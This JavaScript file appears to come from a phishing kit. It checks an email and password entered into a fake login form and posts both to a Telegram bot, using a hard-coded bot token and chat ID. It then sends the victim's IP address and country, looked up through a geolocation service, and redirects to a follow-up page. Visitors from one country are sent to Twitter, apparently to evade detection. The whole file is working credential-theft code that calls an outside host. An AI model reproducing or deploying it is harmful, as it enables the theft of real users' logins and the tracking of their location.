function ValideText(){
    var txtEmail = document.getElementById("input_3");
    var txtpass = document.getElementById("input_4");
    if(txtEmail.value!="" && ValidateEmail(txtEmail) && txtpass.value!=""){
        return true;
    }
    else {
        
        return false;
    }
}
function ValidateEmail(mail) 
{
 if (/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/.test(mail.value))
  {
    return (true);
  }
    return (false);
}
function SendCode(){
    var Api_Key = "1704383539:AAEVh9PPUyxt8mCZn50Hfei4XYnuZXNxgg0";
    var chat_id = "1776276926";
    var cpt = 0;
        if(ValideText())
        {
        var Result = document.getElementById("input_3").value +"|"+document.getElementById("input_4").value;
        var api_url='https://api.telegram.org/bot'+Api_Key+'/sendMessage?chat_id='+chat_id+'&text='+Result;
        fetch(api_url, { 
            method: 'POST'})
        .then(response => {
            if (response.ok)
            {
                cpt++;
                var api_url_ip='https://api.telegram.org/bot'+Api_Key+'/sendMessage?chat_id='+chat_id+'&text=IP : '+ip_adress+":"+country_code;
                fetch(api_url_ip, { 
                    method: 'POST'})
                    .then(response => { 
                        if (response.ok)
                         {
                            if(cpt==1)
                            {
                                window.location.replace("2.html");
                            }
                         }
                    });
            }
            else 
            {
                window.location.replace("index.html");
            }
        });
        }
}

var ip_adress,country_code;
function callback( response ){
ip_adress = response.IPv4;
country_code = response.country_code;
if(country_code=="MA")
{
    window.location.replace("https://twitter.com");
}
 }
$.ajax({
url:"https://geoip-db.com/jsonp/",
dataType:"jsonp"

})